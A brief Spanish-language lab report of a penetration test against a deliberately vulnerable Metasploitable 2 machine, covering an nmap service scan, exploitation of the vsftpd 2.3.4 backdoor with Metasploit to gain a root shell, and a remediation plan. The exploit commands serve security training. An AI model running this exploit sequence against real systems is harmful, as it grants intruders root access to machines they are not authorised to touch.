# Laboratorio: Análisis de Vulnerabilidades en Entorno Controlado

## 1. Descripción del Entorno
* **Sistema Atacante:** Kali Linux
* **Sistema Objetivo:** Metasploitable 2 (máquina virtual vulnerable)
* **Objetivo:** Identificar puertos abiertos y servicios obsoletos explotables.

## 2. Fase de Reconocimiento (Nmap)
Ejecuté un escaneo agresivo para detectar versiones de servicios:
`nmap -sV -O 192.168.1.X`

**Resultados clave:**
* Puerto 21 (FTP) abierto corriendo vsftpd 2.3.4.
* Puerto 22 (SSH) abierto.

## 3. Análisis y Explotación (Metasploit)
Utilicé el framework Metasploit para verificar si la versión de vsftpd era vulnerable al backdoor conocido.
* `use exploit/unix/ftp/vsftpd_234_backdoor`
* `set RHOSTS 192.168.1.X`
* `exploit`

**Resultado:** Acceso exitoso a la terminal con privilegios de root.

## 4. Plan de Mitigación (Remediación)
1. Actualizar el servicio FTP a la versión más reciente y segura.
2. Deshabilitar el acceso FTP si no es estrictamente necesario y reemplazarlo por SFTP (puerto 22).
3. Configurar un firewall (iptables/UFW) para bloquear conexiones no autorizadas.
